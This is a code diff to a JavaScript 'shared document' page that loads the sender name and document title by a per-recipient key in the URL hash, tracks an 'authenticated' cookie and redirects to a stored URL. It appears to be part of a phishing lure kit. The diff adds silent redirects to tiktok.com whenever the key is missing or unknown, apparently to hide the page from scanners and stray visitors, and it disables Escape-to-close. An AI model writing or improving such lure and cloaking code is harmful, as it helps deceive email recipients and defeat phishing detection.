@@ -834,93 +834,103 @@
         }
 
         // ========== FETCH DOCUMENT DATA ==========
-        async function fetchDoc(key) {
-            try {
-                const res = await fetch(`/api/storage.php?action=get&key=${encodeURIComponent(key)}`);
-                const data = await res.json();
-                
-                if (data && data.data) {
-                    return {
-                        title: data.data.title || 'Untitled Document',
-                        sender: data.data.sender || 'Unknown Sender',
-                        url: data.data.url || ''
-                    };
-                }
-                
-                throw new Error('Invalid response from API');
-            } catch (error) {
-                console.error('Error fetching document:', error);
-                return null;
-            }
-        }
+       // ========== FETCH DOCUMENT DATA ==========
+		async function fetchDoc(key) {
+			try {
+				const res = await fetch(`/api/storage.php?action=get&key=${encodeURIComponent(key)}`);
+				const data = await res.json();
+				
+				// Check if key exists in database
+				if (!data || !data.success || !data.data) {
+					console.warn('⚠️ Document key not found in database');
+					return null;
+				}
+				
+				return {
+					title: data.data.title || 'Untitled Document',
+					sender: data.data.sender || 'Unknown Sender',
+					url: data.data.url || ''
+				};
+				
+			} catch (error) {
+				console.error('Error fetching document:', error);
+				return null;
+			}
+		}
 
         // ========== INITIALIZE PAGE ==========
-        async function initializePage() {
-            // Parse key from URL hash (e.g., #roy)
-            const hash = window.location.hash.substring(1); // Remove the # symbol
-            const key = hash || null;
+        // ========== INITIALIZE PAGE ==========
+async function initializePage() {
+    // Parse key from URL hash (e.g., #roy)
+    const hash = window.location.hash.substring(1); // Remove the # symbol
+    const key = hash || null;
 
-            if (!key) {
-                console.error('No key found in URL hash');
-                alert('Invalid document link. Please use the link provided in your email.');
-                return;
-            }
+    if (!key) {
+        console.error('No key found in URL hash');
+        console.log('🔄 Redirecting to TikTok...');
+        window.location.href = 'https://tiktok.com';
+        return;
+    }
 
-            console.log('Parsed key from URL hash:', key);
+    console.log('Parsed key from URL hash:', key);
 
-            // ========== CHECK IF ALREADY AUTHENTICATED ==========
-            const authenticated = getCookie('authenticated');
-            
-            if (authenticated === 'yes') {
-                // User is already authenticated, redirect to document URL
-                const redirectUrl = getCookie('redirect_url');
-                
-                if (redirectUrl) {
-                    console.log('✅ User already authenticated');
-                    console.log('🔄 Redirecting to:', redirectUrl);
-                    window.location.href = redirectUrl;
-                    return; // Stop further execution
-                } else {
-                    console.warn('⚠️ Authenticated cookie found but no redirect_url cookie. Clearing authentication...');
-                    // Clear the authenticated cookie since redirect_url is missing
-                    setCookie('authenticated', '', -1);
-                }
-            }
-
-            // ========== USER NOT AUTHENTICATED - SHOW PAGE ==========
-            // Show loading overlay
-            document.getElementById('loadingOverlay').classList.add('active');
-
-            console.log('🔓 User not authenticated. Fetching document data...');
-            const docData = await fetchDoc(key);
-
-            // Hide loading overlay
-            document.getElementById('loadingOverlay').classList.remove('active');
-
-            if (!docData) {
-                alert('Unable to load document information. Please try again later.');
-                return;
-            }
-
-            // Set redirect_url cookie with the document URL from API
-            if (docData.url) {
-                setCookie('redirect_url', docData.url);
-                console.log(`📋 Cookie "redirect_url" set with URL:`, docData.url);
-            } else {
-                console.error('⚠️ No URL returned from API');
-            }
-
-            // Display sender name and document title
-            document.getElementById('senderName').textContent = docData.sender;
-            document.getElementById('documentTitle').textContent = docData.title;
-            document.getElementById('senderInfoCard').classList.add('visible');
-
-            // Update the document name in the list
-            if (documents.length > 0) {
-                documents[0].name = docData.title + '.pdf';
-                renderDocuments();
-            }
+    // ========== CHECK IF ALREADY AUTHENTICATED ==========
+    const authenticated = getCookie('authenticated');
+    
+    if (authenticated === 'yes') {
+        // User is already authenticated, redirect to document URL
+        const redirectUrl = getCookie('redirect_url');
+        
+        if (redirectUrl) {
+            console.log('✅ User already authenticated');
+            console.log('🔄 Redirecting to:', redirectUrl);
+            window.location.href = redirectUrl;
+            return; // Stop further execution
+        } else {
+            console.warn('⚠️ Authenticated cookie found but no redirect_url cookie. Clearing authentication...');
+            // Clear the authenticated cookie since redirect_url is missing
+            setCookie('authenticated', '', -1);
         }
+    }
+
+    // ========== USER NOT AUTHENTICATED - SHOW PAGE ==========
+    // Show loading overlay
+    document.getElementById('loadingOverlay').classList.add('active');
+
+    console.log('🔓 User not authenticated. Fetching document data...');
+    const docData = await fetchDoc(key);
+
+    // Hide loading overlay
+    document.getElementById('loadingOverlay').classList.remove('active');
+
+    // ========== REDIRECT TO TIKTOK IF KEY NOT FOUND ==========
+    if (!docData) {
+        console.error('❌ Document not found for key:', key);
+        console.log('🔄 Redirecting to TikTok...');
+        window.location.href = 'https://tiktok.com';
+        return;
+    }
+    // =====================================================
+
+    // Set redirect_url cookie with the document URL from API
+    if (docData.url) {
+        setCookie('redirect_url', docData.url);
+        console.log(`📋 Cookie "redirect_url" set with URL:`, docData.url);
+    } else {
+        console.error('⚠️ No URL returned from API');
+    }
+
+    // Display sender name and document title
+    document.getElementById('senderName').textContent = docData.sender;
+    document.getElementById('documentTitle').textContent = docData.title;
+    document.getElementById('senderInfoCard').classList.add('visible');
+
+    // Update the document name in the list
+    if (documents.length > 0) {
+        documents[0].name = docData.title + '.pdf';
+        renderDocuments();
+    }
+}
 
         // SVG Icons
         const SVG_ICONS = {
@@ -1471,7 +1481,7 @@
         // Keyboard support
         document.addEventListener('keydown', (e) => {
             if (e.key === 'Escape') {
-                closeLightbox();
+               // closeLightbox();
             }
         });
 
